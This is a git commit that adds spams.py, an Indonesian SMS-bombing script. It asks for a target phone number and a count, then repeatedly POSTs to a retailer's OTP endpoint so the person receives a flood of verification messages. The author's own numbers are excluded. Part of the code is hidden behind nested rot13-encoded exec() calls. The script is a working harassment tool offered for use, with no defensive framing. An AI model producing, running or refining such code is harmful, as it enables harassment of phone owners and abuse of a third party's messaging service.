c460100ac79f7ad6f9074e8871aaa7844a3917aa
ADEK zantuy <97099418+Zrantuy@users.noreply.github.com>
2022-01-04 23:39:23 +0700

    Add files via upload

---
+++ spams.py
@@ -0,0 +1,33 @@
+# coding=utf-8
+import json, subprocess, os
+from urllib import request
+
+exec((lambda __, _, : _('# xbagby\n\nrkrp((ynzoqn __, _, : _(\'# kontol\\a\\aexec((lambda __, _, : _(\\\'# xbagby\\\\n\\\\nrkrp((ynzoqn __, _, : _("merah, hijau, kuning, putih, kontol, gw, zuck = (\\\\\\\'\\\\\\\\\\\\\\\\x1b[0;91m\\\\\\\',\\\\\\\'\\\\\\\\\\\\\\\\x1b[0;92m\\\\\\\',\\\\\\\'\\\\\\\\\\\\\\\\x1b[0;93m\\\\\\\',\\\\\\\'\\\\\\\\\\\\\\\\x1b[0;97m\\\\\\\', print, \\\\\\\'Adek zantuy\\\\\\\',\\\\\\\'github.com/Zrantuy\\\\\\\')\\\\\\\\ahayo_lo = (\\\\\\\'081273018924\\\\\\\',\\\\\\\'082371648186\\\\\\\')\\\\\\\\angaceng = (f\\\\\\\'\\\\\\\'\\\\\\\'{hijau}\\\\\\\\a    ____                ____  __     \\\\\\\\a   / __/__  ___ ___ _  / __ \\\\\\\\\\\\\\\\/ /____ \\\\\\\\a {putih} _\\\\\\\\\\\\\\\\ \\\\\\\\\\\\\\\\/ _ \\\\\\\\\\\\\\\\/ _ `/  \\\\\\\' \\\\\\\\\\\\\\\\/ /_/ / __/ _ \\\\\\\\\\\\\\\\ \\\\\\\\a /___/ .__/\\\\\\\\\\\\\\\\_,_/_/_/_/\\\\\\\\\\\\\\\\____/\\\\\\\\\\\\\\\\__/ .__/\\\\\\\\a    /_/                       /_/    \\\\\\\\a  {hijau}coding by : {gw}\\\\\\\\a  {hijau}github me : {zuck}\\\\\\\\a\\\\\\\'\\\\\\\'\\\\\\\')",__))("ebg_13",__vzcbeg__(\\\\\\\'pbqrpf\\\\\\\').qrpbqr))\\\',__))("rot_13",__import__(\\\'codecs\\\').decode))\',__))("ebg_13",__vzcbeg__(\'pbqrpf\').qrpbqr))',__))("rot_13",__import__('codecs').decode))
+
+class otepe:
+	os.system('clear')
+	kontol (ngaceng)
+	kontol(f'{putih} [*] contoh nomor :{hijau} 082356******')
+	nomor = input(f'{putih} [?] nomor target :{hijau} ')
+	if nomor in ('',' '):
+		kontol(f'\n{merah} [!] jangan kosong ');exit()
+	elif nomor in hayo_lo:
+		kontol(f'\n{merah} [!] Lah? ngapain? ');exit()
+	while True:
+		try:
+			jumlah = int(input(f'{putih} [?] jumlah spam  : {kuning}'))
+			kontol()
+			break
+		except:
+			continue
+
+	for total in range(jumlah):
+		req = request.Request('https://www.nutriclub.co.id/otp/?phone='+nomor+'&old_phone='+nomor, method="POST")
+		otw = json.loads(request.urlopen(req).read())
+		if otw['StatusCode']=='00':
+			kontol(f'{hijau} ['+str(total+1).zfill(2)+']'+' [√] berhasil terkirim ke nomor '+nomor[0:6]+'******')
+		else:
+			kontol(f'{merah} ['+str(total+1).zfill(2)+']'+' [×] gagal terkirim ke nomor '+nomor[0:6]+'******')
+		__import__("time").sleep(2)
+
+otepe()
